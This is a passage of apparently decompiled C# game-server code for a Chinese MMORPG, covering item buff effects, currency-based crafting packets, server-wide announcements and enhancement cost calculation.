								追加状态列表.Add(追加状态类21.FLD_PID, 追加状态类21);
								base.人物追加最大_HP += 500;
								break;
							}
							case 1007000007:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类51 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类51.FLD_PID, 追加状态类51);
								base.人物追加最大_HP += 700;
								break;
							}
							case 1000000830:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								追加状态类 追加状态类37 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类37.FLD_PID, 追加状态类37);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								base.人物追加最大_HP += 100;
								break;
							}
							case 1000000831:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								追加状态类 追加状态类18 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类18.FLD_PID, 追加状态类18);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								base.人物追加最大_HP += 50;
								break;
							}
							case 1000000832:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								追加状态类 追加状态类15 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类15.FLD_PID, 追加状态类15);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								base.人物追加最大_HP += 100;
								base.人物追加最大_MP += 100;
								break;
							}
							case 1000000835:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								追加状态类 追加状态类54 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类54.FLD_PID, 追加状态类54);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								base.FLD_追加百分比_MP上限 += 0.05;
								break;
							}
							case 1000000836:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								追加状态类 追加状态类47 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类47.FLD_PID, 追加状态类47);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								base.FLD_追加百分比_HP上限 += 0.05;
								break;
							}
							case 1000000408:
							{
								if (GetAddState(num))
								{
									追加状态列表[num].时间结束事件();
								}
								追加状态类 追加状态类34 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类34.FLD_PID, 追加状态类34);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								addFLD_追加百分比_攻击(0.1);
								break;
							}
							case 1000000409:
							{
								if (GetAddState(num))
								{
									追加状态列表[num].时间结束事件();
								}
								追加状态类 追加状态类32 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类32.FLD_PID, 追加状态类32);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								base.人物追加最大_HP += 500;
								break;
							}
							case 1000000410:
							{
								if (GetAddState(num))
								{
									追加状态列表[num].时间结束事件();
								}
								追加状态类 追加状态类13 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类13.FLD_PID, 追加状态类13);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								base.人物追加最大_MP += 500;
								break;
							}
							case 1000000411:
							{
								if (GetAddState(num))
								{
									追加状态列表[num].时间结束事件();
								}
								追加状态类 追加状态类4 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								addFLD_追加百分比_防御(0.1);
								break;
							}
							case 1000000412:
							{
								if (GetAddState(num))
								{
									追加状态列表[num].时间结束事件();
								}
								追加状态类 追加状态类58 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类58.FLD_PID, 追加状态类58);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								addFLD_追加百分比_攻击(0.05);
								break;
							}
							case 1000000413:
							{
								if (GetAddState(num))
								{
									追加状态列表[num].时间结束事件();
								}
								追加状态类 追加状态类53 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类53.FLD_PID, 追加状态类53);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								addFLD_追加百分比_防御(0.05);
								break;
							}
							case 1000000414:
							{
								if (GetAddState(num))
								{
									追加状态列表[num].时间结束事件();
								}
								追加状态类 追加状态类43 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类43.FLD_PID, 追加状态类43);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								base.FLD_人物_追加百分比_回避 += 0.05;
								break;
							}
							case 1008000053:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类41 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类41.FLD_PID, 追加状态类41);
								base.FLD_人物_武功攻击力增加百分比 += 0.1;
								break;
							}
							case 1008000016:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类28 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类28.FLD_PID, 追加状态类28);
								addFLD_追加百分比_攻击(0.1);
								break;
							}
							case 1008000017:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类25 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类25.FLD_PID, 追加状态类25);
								addFLD_追加百分比_防御(0.1);
								break;
							}
							case 1008000018:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类16 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类16.FLD_PID, 追加状态类16);
								addFLD_装备_追加_武器_强化(2);
								break;
							}
							case 1008000019:
							{
								if (GetAddState(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类7 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类7.FLD_PID, 追加状态类7);
								addFLD_装备_追加_防具_强化(1);
								break;
							}
							case 1007000014:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类65 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类65.FLD_PID, 追加状态类65);
								base.人物追加最大_HP += 700;
								break;
							}
							case 1008000095:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类63 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类63.FLD_PID, 追加状态类63);
								base.FLD_人物_追加_经验百分比 += 0.2;
								break;
							}
							case 1008000096:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类56 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类56.FLD_PID, 追加状态类56);
								base.FLD_人物_追加_经验百分比 += 0.3;
								break;
							}
							case 1008000097:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类50 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类50.FLD_PID, 追加状态类50);
								base.FLD_人物_追加_经验百分比 += 0.4;
								break;
							}
							case 1008000054:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类48 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类48.FLD_PID, 追加状态类48);
								base.FLD_人物_武功防御力增加百分比 += 0.1;
								break;
							}
							case 1008000183:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类40 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类40.FLD_PID, 追加状态类40);
								base.人物追加最大_HP += 300;
								addFLD_追加百分比_防御(0.05);
								break;
							}
							case 1008000156:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类38 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类38.FLD_PID, 追加状态类38);
								base.人物追加最大_HP += 300;
								break;
							}
							case 1008000159:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类31 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类31.FLD_PID, 追加状态类31);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								break;
							}
							case 1008000160:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类29 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类29.FLD_PID, 追加状态类29);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								break;
							}
							case 1008000195:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类23 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类23.FLD_PID, 追加状态类23);
								base.人物追加最大_HP += 300;
								addFLD_追加百分比_防御(0.05);
								int num3 = ++base.FLD_人物_追加_气功;
								break;
							}
							case 1008000188:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[1008000188].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类19 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类19.FLD_PID, 追加状态类19);
								addFLD_追加百分比_攻击(0.15);
								addFLD_追加百分比_防御(0.15);
								base.人物追加最大_HP += 300;
								base.人物追加最大_MP += 300;
								base.FLD_人物_追加_经验百分比 += 0.1;
								break;
							}
							case 1008000187:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类12 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类12.FLD_PID, 追加状态类12);
								base.人物追加最大_HP += 300;
								int num3 = ++base.FLD_人物_追加_气功;
								break;
							}
							case 1008000304:
							{
								if (妖花青草)
								{
									return;
								}
								妖花青草 = true;
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类10 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类10.FLD_PID, 追加状态类10);
								base.FLD_人物_追加_经验百分比 += 0.05;
								base.FLD_人物_追加_攻击 += 30;
								base.FLD_人物_追加_防御 += 30;
								base.FLD_人物_武功攻击力增加百分比 += 0.03;
								break;
							}
							case 1008000305:
							{
								if (妖花青草)
								{
									return;
								}
								妖花青草 = true;
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类8 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类8.FLD_PID, 追加状态类8);
								base.FLD_人物_追加_经验百分比 += 0.05;
								base.FLD_人物_追加_攻击 += 30;
								base.FLD_人物_追加_防御 += 30;
								base.FLD_人物_武功攻击力增加百分比 += 0.03;
								break;
							}
							case 1008000306:
							{
								if (妖花青草)
								{
									return;
								}
								妖花青草 = true;
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类5 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类5.FLD_PID, 追加状态类5);
								base.FLD_人物_追加_经验百分比 += 0.1;
								base.FLD_人物_追加_攻击 += 40;
								base.FLD_人物_追加_防御 += 40;
								base.FLD_人物_武功攻击力增加百分比 += 0.05;
								break;
							}
							case 1008000307:
							{
								if (妖花青草)
								{
									return;
								}
								妖花青草 = true;
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类67 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类67.FLD_PID, 追加状态类67);
								base.FLD_人物_追加_经验百分比 += 0.1;
								base.FLD_人物_追加_攻击 += 40;
								base.FLD_人物_追加_防御 += 40;
								base.FLD_人物_武功攻击力增加百分比 += 0.05;
								break;
							}
							case 1008000232:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类64 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类64.FLD_PID, 追加状态类64);
								base.人物追加最大_HP += 300;
								base.FLD_人物_追加_经验百分比 += 0.1;
								base.FLD_人物_追加_获得游戏币百分比 += 0.4;
								base.FLD_人物_追加_物品掉落概率百分比 += 0.2;
								break;
							}
							case 1008000239:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类61 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类61.FLD_PID, 追加状态类61);
								double num4 = base.FLD_人物_追加_经验百分比 += 1.0;
								break;
							}
							case 1008000240:
							{
								if (妖花青草)
								{
									return;
								}
								妖花青草 = true;
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类59 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类59.FLD_PID, 追加状态类59);
								base.FLD_人物_追加_经验百分比 += 0.05;
								base.FLD_人物_追加_攻击 += 30;
								base.FLD_人物_武功攻击力增加百分比 += 0.03;
								break;
							}
							case 1008000241:
							{
								if (妖花青草)
								{
									return;
								}
								妖花青草 = true;
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类57 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类57.FLD_PID, 追加状态类57);
								base.FLD_人物_追加_经验百分比 += 0.05;
								base.FLD_人物_追加_攻击 += 30;
								base.FLD_人物_武功攻击力增加百分比 += 0.03;
								break;
							}
							case 1008000242:
							{
								if (妖花青草)
								{
									return;
								}
								妖花青草 = true;
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类55 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类55.FLD_PID, 追加状态类55);
								base.FLD_人物_追加_经验百分比 += 0.05;
								base.FLD_人物_追加_攻击 += 30;
								base.FLD_人物_武功攻击力增加百分比 += 0.03;
								break;
							}
							case 1008000243:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类52 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类52.FLD_PID, 追加状态类52);
								addFLD_追加百分比_攻击(0.2);
								addFLD_追加百分比_防御(0.2);
								base.人物追加最大_HP += 200;
								base.FLD_人物_追加_经验百分比 += 0.15;
								base.FLD_人物_武功攻击力增加百分比 += 0.05;
								break;
							}
							case 1008000245:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类49 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类49.FLD_PID, 追加状态类49);
								base.人物追加最大_HP += 300;
								base.FLD_人物_追加_回避 += (int)((double)base.FLD_回避 * 0.05);
								base.FLD_人物_武功攻击力增加百分比 += 0.1;
								int num3 = ++base.FLD_人物_追加_气功;
								break;
							}
							case 1008000248:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类46 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类46.FLD_PID, 追加状态类46);
								double num4 = base.FLD_人物_追加_经验百分比 += 1.0;
								num4 = (base.FLD_人物_追加_获得游戏币百分比 += 1.0);
								num4 = (base.FLD_人物_追加_物品掉落概率百分比 += 1.0);
								num4 = (base.FLD_人物_追加_历练百分比 += 1.0);
								break;
							}
							case 1008000250:
							{
								if (妖花青草)
								{
									return;
								}
								妖花青草 = true;
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类44 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类44.FLD_PID, 追加状态类44);
								base.FLD_人物_追加_经验百分比 += 0.05;
								base.FLD_人物_追加_攻击 += 30;
								base.FLD_人物_武功攻击力增加百分比 += 0.03;
								break;
							}
							case 1008000251:
							{
								if (妖花青草)
								{
									return;
								}
								妖花青草 = true;
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类42 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类42.FLD_PID, 追加状态类42);
								base.FLD_人物_追加_经验百分比 += 0.05;
								base.FLD_人物_追加_攻击 += 30;
								base.FLD_人物_武功攻击力增加百分比 += 0.03;
								break;
							}
							case 1008000252:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类39 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类39.FLD_PID, 追加状态类39);
								int num3 = ++base.FLD_人物_追加_防御;
								num3 = ++base.人物追加最大_HP;
								num3 = ++base.FLD_人物_追加_回避;
								base.FLD_人物_武功防御力增加百分比 += 0.01;
								base.FLD_人物_武功攻击力增加百分比 += 0.2;
								break;
							}
							case 1008000362:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类36 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类36.FLD_PID, 追加状态类36);
								base.FLD_人物_追加_经验百分比 += 1.5;
								break;
							}
							case 1008000321:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类33 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类33.FLD_PID, 追加状态类33);
								base.FLD_人物_追加_经验百分比 += 0.4;
								break;
							}
							case 1008000322:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类30 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类30.FLD_PID, 追加状态类30);
								base.FLD_人物_追加_经验百分比 += 0.4;
								break;
							}
							case 1008000323:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类27 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类27.FLD_PID, 追加状态类27);
								double num4 = base.FLD_人物_追加_经验百分比 += 1.0;
								break;
							}
							case 1008000324:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类24 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类24.FLD_PID, 追加状态类24);
								double num4 = base.FLD_人物_追加_经验百分比 += 1.0;
								break;
							}
							case 1008000325:
							{
								if (妖花青草)
								{
									return;
								}
								妖花青草 = true;
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类22 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类22.FLD_PID, 追加状态类22);
								base.FLD_人物_追加_经验百分比 += 0.1;
								base.FLD_人物_追加_攻击 += 40;
								base.FLD_人物_追加_防御 += 40;
								base.FLD_人物_武功攻击力增加百分比 += 0.05;
								base.人物追加最大_HP += 300;
								break;
							}
							case 1008000326:
							{
								if (妖花青草)
								{
									return;
								}
								妖花青草 = true;
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类20 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类20.FLD_PID, 追加状态类20);
								base.FLD_人物_追加_经验百分比 += 0.1;
								base.FLD_人物_追加_攻击 += 40;
								base.FLD_人物_追加_防御 += 40;
								base.FLD_人物_武功攻击力增加百分比 += 0.05;
								base.人物追加最大_HP += 300;
								break;
							}
							case 1008000389:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								追加状态类 追加状态类17 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类17.FLD_PID, 追加状态类17);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								base.FLD_人物_追加_经验百分比 += 1.5;
								break;
							}
							case 1008000388:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								追加状态类 追加状态类14 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类14.FLD_PID, 追加状态类14);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								base.FLD_人物_追加_经验百分比 += 3.0;
								break;
							}
							case 1008000363:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类11 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类11.FLD_PID, 追加状态类11);
								base.FLD_人物_追加_经验百分比 += 1.5;
								break;
							}
							case 1008001111:
							{
								if (妖花青草)
								{
									return;
								}
								妖花青草 = true;
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类9 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类9.FLD_PID, 追加状态类9);
								base.人物追加最大_HP += 500;
								base.人物追加最大_MP += 500;
								base.FLD_人物_追加_经验百分比 += 0.04;
								base.FLD_人物_追加_攻击 += 50;
								base.FLD_人物_追加_防御 += 100;
								base.FLD_人物_武功攻击力增加百分比 += 0.1;
								break;
							}
							case 1008001021:
							case 1008001022:
							case 1008001023:
							case 1008001024:
							case 1008001025:
							case 1008001026:
							case 1008001027:
							case 1008001028:
							case 1008001029:
							case 1008001030:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								追加状态类 追加状态类6 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类6.FLD_PID, 追加状态类6);
								状态效果(BitConverter.GetBytes(num), 1, num2);
								break;
							}
							case 1008001814:
							{
								if (追加状态列表.ContainsKey(num))
								{
									追加状态列表[num].时间结束事件();
								}
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类3 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类3.FLD_PID, 追加状态类3);
								base.FLD_追加百分比_攻击 += 0.28;
								base.FLD_人物_追加_攻击 += 80;
								base.FLD_追加百分比_防御 += 0.3;
								base.FLD_人物_追加_防御 += 80;
								base.人物追加最大_HP += 3000;
								base.FLD_人物_武功攻击力增加百分比 += 0.35;
								base.FLD_人物_武功防御力增加百分比 += 0.23;
								base.FLD_人物_追加_经验百分比 += 2.1;
								base.FLD_人物_追加_吸魂几率百分比 += 10.0;
								break;
							}
							case 1008001112:
							{
								if (妖花青草)
								{
									return;
								}
								妖花青草 = true;
								状态效果(BitConverter.GetBytes(num), 1, num2);
								追加状态类 追加状态类 = new 追加状态类(this, num2, num, 1);
								追加状态列表.Add(追加状态类.FLD_PID, 追加状态类);
								base.人物追加最大_HP += 800;
								base.FLD_人物_追加_回避 += 10;
								base.FLD_人物_追加_武功防御力 += 100.0 / World.武功防御力控制;
								base.FLD_人物_追加_攻击 += 100;
								base.FLD_人物_追加_防御 += 50;
								base.FLD_人物_武功攻击力增加百分比 += 0.1;
								break;
							}
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "Set个人药品出错![" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 合成系统解锁()
		{
			for (int i = 0; i < 66; i++)
			{
				装备栏包裹[i].锁定 = false;
			}
		}

		public void 合成系统加锁()
		{
			for (int i = 0; i < 66; i++)
			{
				装备栏包裹[i].锁定 = true;
			}
		}

		public void 元宝合成(byte[] 封包数据, int 封包大小)
		{
			查百宝阁元宝数();
			byte[] dst = new byte[4];
			System.Buffer.BlockCopy(封包数据, 10, dst, 0, 4);
			byte[] array = Converter.hexStringToByte("AA551E002A0121171000010000009400000000000000190000000000000000005C9355AA");
			if (base.FLD_RXPIONT >= World.元宝合成)
			{
				System.Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 10, 4);
				元宝合成开关 = 1;
			}
			else
			{
				System.Buffer.BlockCopy(BitConverter.GetBytes(4), 0, array, 10, 4);
				元宝合成开关 = 0;
			}
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.FLD_RXPIONT), 0, array, 14, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 18, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(5), 0, array, 22, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 元宝合成2(byte[] 封包数据, int 封包大小)
		{
			查百宝阁元宝数();
			byte[] dst = new byte[4];
			System.Buffer.BlockCopy(封包数据, 10, dst, 0, 4);
			byte[] array = Converter.hexStringToByte("AA551E002A0123171000010000009400000000000000190000000000000000005C9355AA");
			if (base.FLD_RXPIONT >= World.元宝合成)
			{
				System.Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 10, 4);
				检察元宝数据(World.元宝合成, 0);
				元宝合成开关 = 1;
				RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "元宝合成", 1, World.元宝合成);
				保存元宝数据();
			}
			else
			{
				System.Buffer.BlockCopy(BitConverter.GetBytes(4), 0, array, 10, 4);
				元宝合成开关 = 0;
			}
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.FLD_RXPIONT), 0, array, 14, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 18, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(5), 0, array, 22, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 发送快报(string 人物名, int 强化阶段, byte[] PID, int 人物势力)
		{
			byte[] array = Converter.hexStringToByte("AA555E002C01005050000100000002000000000000000A000000C900000042EEF80500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000008AF855AA");
			byte[] bytes = Encoding.Default.GetBytes(人物名);
			System.Buffer.BlockCopy(bytes, 0, array, 38, bytes.Length);
			System.Buffer.BlockCopy(BitConverter.GetBytes(强化阶段), 0, array, 22, 1);
			System.Buffer.BlockCopy(PID, 0, array, 30, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(人物势力), 0, array, 88, 1);
			foreach (Players value in World.allConnectedChars.Values)
			{
				if (value.Client != null && !value.Client.挂机)
				{
					value.Client.Send多包(array, array.Length);
				}
			}
		}

		public int 计算合成强化费用(ItmeClass Itme, int 位置, int 操作ID)
		{
			int num = (Itme.FLD_LEVEL <= 60) ? ((int)((double)Itme.FLD_LEVEL * 0.1 * 2000.0)) : ((Itme.FLD_LEVEL > 60 && Itme.FLD_LEVEL <= 70) ? 50000 : ((Itme.FLD_LEVEL > 70 && Itme.FLD_LEVEL <= 80) ? 60000 : ((Itme.FLD_LEVEL > 80 && Itme.FLD_LEVEL <= 90) ? 80000 : ((Itme.FLD_LEVEL > 90 && Itme.FLD_LEVEL <= 100) ? 100000 : ((Itme.FLD_LEVEL > 100 && Itme.FLD_LEVEL <= 110) ? 150000 : ((Itme.FLD_LEVEL > 110 && Itme.FLD_LEVEL <= 120) ? 200000 : ((Itme.FLD_LEVEL > 120 && Itme.FLD_LEVEL <= 130) ? 250000 : ((Itme.FLD_LEVEL > 130 && Itme.FLD_LEVEL <= 140) ? 300000 : ((Itme.FLD_LEVEL <= 140 || Itme.FLD_LEVEL > 150) ? ((int)((double)Itme.FLD_LEVEL * 0.1 * 50000.0)) : 350000)))))))));
			switch (操作ID)
			{
			case 61:
				if (装备栏包裹[位置].FLD_强化数量 != 0)
				{
					num *= 装备栏包裹[位置].FLD_强化数量 + 1;
				}
				break;
			case 21:
				if (装备栏包裹[位置].FLD_强化数量 != 0)
				{
					num *= 装备栏包裹[位置].FLD_强化数量 + 1;
				}
				break;
			case 11:
				if (装备栏包裹[位置].FLD_强化数量 != 0)
				{
					num *= 装备栏包裹[位置].FLD_强化数量 + 1;
				}
				break;
			}
			return num;
		}

		public void 合成提示(int 操作ID, int 提示ID, int 钱数, 物品类 物品)
		{
